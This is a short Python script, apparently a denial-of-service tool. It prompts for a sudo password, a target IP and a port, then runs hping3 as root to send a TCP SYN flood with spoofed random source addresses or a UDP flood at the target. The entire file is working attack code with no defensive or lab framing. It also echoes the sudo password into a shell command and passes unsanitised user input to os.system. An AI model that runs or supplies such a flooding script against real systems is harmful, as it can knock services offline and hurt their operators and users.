import os
import getpass

sudoPassword = getpass.getpass()
tcp_flood_command_list = ['hping3','--rand-source','-i','u1','-S','-p']
udp_flood_command_list = ['hping3', '--udp', '--flood']
ip_addr = input("Enter the IP Address: ")
port_no = input("Enter the Port No: ")

attack = int(input("Enter 1 for TCP SYN flood or 2 for UDP flood: "))
assert attack == 1 or attack == 2

if attack == 1:
	tcp_flood_command_list.append(port_no)
	tcp_flood_command_list.append(ip_addr)
	command_string = ' '.join([str(element) for element in tcp_flood_command_list])
	p = os.system('echo %s|sudo -S %s' % (sudoPassword, command_string))
elif attack == 2:
	udp_flood_command_list.insert(1,ip_addr)
	command_string = ' '.join([str(element) for element in udp_flood_command_list])
	p = os.system('echo %s|sudo -S %s' % (sudoPassword, command_string))
else:
	print("This is some magic number and beyond the capability of this script")



